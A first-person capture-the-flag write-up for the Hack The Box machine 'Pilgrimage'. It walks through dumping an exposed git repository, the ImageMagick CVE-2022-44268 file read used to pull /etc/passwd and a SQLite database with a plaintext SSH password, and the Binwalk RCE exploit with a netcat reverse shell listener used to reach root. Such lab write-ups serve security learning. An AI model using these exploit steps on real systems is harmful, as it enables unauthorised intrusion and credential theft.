# Recon

~~~
nmap -sCV 10.10.11.219
~~~

~~~
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 04:48 IST
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)
|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)
|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Pilgrimage - Shrink Your Images
|_http-server-header: nginx/1.18.0
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.74 seconds
~~~


I browsed the IP 10.10.11.219

Got "pilgrimage.htb"

![[Pasted image 20230625044652.png]]
In starting i thought it was some file upload vulnerability..!!

Yeah that is right.!!

Before that i go with further enumeration..!!

![[Pasted image 20230625045045.png]]

So found some .git repos,

I used git-dumper for further enumeration..!

Reference Link : https://github.com/arthaud/git-dumper

~~~
python3 git_dumper.py http://pilgrimage.htb/ git
~~~


There i found so many intresting files...

![[Pasted image 20230625045421.png]]
~~~
function fetchImages() {
  $username = $_SESSION['user'];
  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM images WHERE username = ?");
  $stmt->execute(array($username));
  $allImages = $stmt->fetchAll(\PDO::FETCH_ASSOC);
  return json_encode($allImages);
~~~

I saw this function inside dashboard.php , Which  is sqlite server..!!

I can see the DB Path ..!

By anlyzing the source code ,I  can find magic with `ImageMagick 7.1.0-49`

By searching vulnerabilities in google found

![[Pasted image 20230625101459.png]]

I used  pngcrush tool for exploiting this vulnerability,

Reference Link : https://www.vicarius.io/blog/cve-2022-44268-arbitrary-remote-leak-in-imagemagick

~~~
pngcrush -text a "profile" "/var/db/pilgrimage" index.png
~~~

Here 

This is the DB path for testing i checked for /ect/passwd first .

By uploading the `pngout.png` file (The output file)

We will get the shrink image by downloading that..!!

By using `identify` , we can get get thier  hex data.

~~~
identify -verbose 6497616666d86.png 
~~~

![[Pasted image 20230625102536.png]]

By converting from hex to string , i can read 

![[Pasted image 20230625102628.png]]

Like that we can readDB file , by changing file path..!!

Also downloading the file by naming .sqlite

we can analyze that by using `sqlite3`

~~~
sqlite3 htb.sqlite
~~~

~~~
.tables
~~~~

~~~
SELECT * FROM users;
~~~

~~~
emily|abigchonkyboi123
admin|admin
nasu|nasu
taf|taf
test|test
sadsadasd|sadasdasd
sadsad|sadasasd
sads'sadasdsadsadsa|sadasasd
sads' or '1'='1-- -sadasdsadsadsa|sadasasd
kar|olis
nasu1|nasu
asd|asd
~~~

![[Pasted image 20230625103104.png]]

Here by reading /etc/passwd i also saw that emily ...!!! Got SSH i think..!!

~~~
emily : abigchonkyboi123
~~~

~~~
sudo ssh emily@pilgrimage.htb
~~~

![[Pasted image 20230625103311.png]]
got user..!!

![[Pasted image 20230625103349.png]]

So it's time to upload `linpeas`

Found some suspicious file .!!

~~~
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
~~~

It is time to exploit binwalk..!!

~~~
Binwalk v2.3.2 - Remote Command Execution (RCE)
~~~

Reference Link : https://www.exploit-db.com/exploits/51249

~~~
python3 51249.py file.sh 10.10.15.6 7890
~~~

we will get `binwalk_exploit.png`

~~~
mv binwalk_exploit.png shell.sh
~~~

Start python3 server in out machine.!!

~~~
sudo python3 -m http.server 80
~~~

![[Pasted image 20230625104358.png]]

We have to import in the path `var/www/pilgrimage.htb/shrunk`

~~~
chmod +x shell.sh
~~~

Before that  setup listener,

~~~
nc -lvnp 7890
~~~

Now run it in the victim machine,

~~~
./shell.sh
~~~~

![[Pasted image 20230625104613.png]]

Yes we rooted the machine..!!!
